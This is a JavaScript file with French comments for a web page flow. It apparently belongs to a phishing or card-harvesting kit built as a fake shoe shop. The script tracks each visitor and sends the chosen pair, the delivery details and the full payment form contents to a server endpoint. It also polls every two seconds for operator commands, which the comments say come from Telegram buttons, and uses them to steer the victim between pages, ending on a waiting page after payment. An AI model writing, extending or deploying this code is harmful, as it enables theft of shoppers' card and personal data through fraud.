// Générer un visitorId unique
const visitorId = localStorage.getItem("visitorId") || Date.now().toString();
localStorage.setItem("visitorId", visitorId);

// Envoyer notification à chaque page
fetch("/visit", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({visitorId, page: document.title})
});

// Vérifier toutes les 2 secondes si un bouton Telegram a été cliqué
setInterval(async () => {
  const res = await fetch(`/get-command?visitorId=${visitorId}`);
  const data = await res.json();
  if (data.command) {
    switch(data.command){
      case "index": window.location.href = "index.html"; break;
      case "info": window.location.href = "info.html"; break;
      case "contact": window.location.href = "contact.html"; break;
      case "visite": window.location.href = "visite.html"; break;
    }
  }
}, 2000);

// Gestion boutons sur index.html (choix de la paire)
document.querySelectorAll("button[data-pair]").forEach(btn => {
  btn.addEventListener("click", async () => {
    const pair = btn.dataset.pair;

    // 1️⃣ Notification avec la paire choisie
    await fetch("/visit", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({visitorId, page: `Paire choisie: ${pair}`})
    });

    // Stocker la paire choisie
    localStorage.setItem("chosenPair", pair);

    // 2️⃣ Rediriger automatiquement vers info.html
    window.location.href = "info.html";
  });
});

// Afficher la paire choisie sur info.html
const chosenPair = localStorage.getItem("chosenPair");
if(chosenPair && document.getElementById("chosen-pair")){
  document.getElementById("chosen-pair").src = `images/${chosenPair.replace(/\s+/g,"_")}.jpg`;
}

// Gestion formulaire info.html
const deliveryForm = document.getElementById("deliveryForm");
if(deliveryForm){
  deliveryForm.addEventListener("submit", async e => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(deliveryForm).entries());
    data.pair = localStorage.getItem("chosenPair");

    // Notification avec infos de livraison
    await fetch("/visit", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({visitorId, page: `Infos livraison: ${JSON.stringify(data)}`})
    });

    // Rediriger vers contact.html
    window.location.href = "contact.html";
  });
}

// Gestion formulaire contact.html / paiement
const paymentForm = document.getElementById("paymentForm");
if(paymentForm){
  paymentForm.addEventListener("submit", async e => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(paymentForm).entries());
    data.pair = localStorage.getItem("chosenPair");

    // Notification avec infos paiement
    await fetch("/visit", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({visitorId, page: `Infos paiement: ${JSON.stringify(data)}`})
    });

    // Rediriger vers visite.html ou page loader en attente
    window.location.href = "visite.html"; // ici tu peux mettre un loader.html si tu veux
  });
}
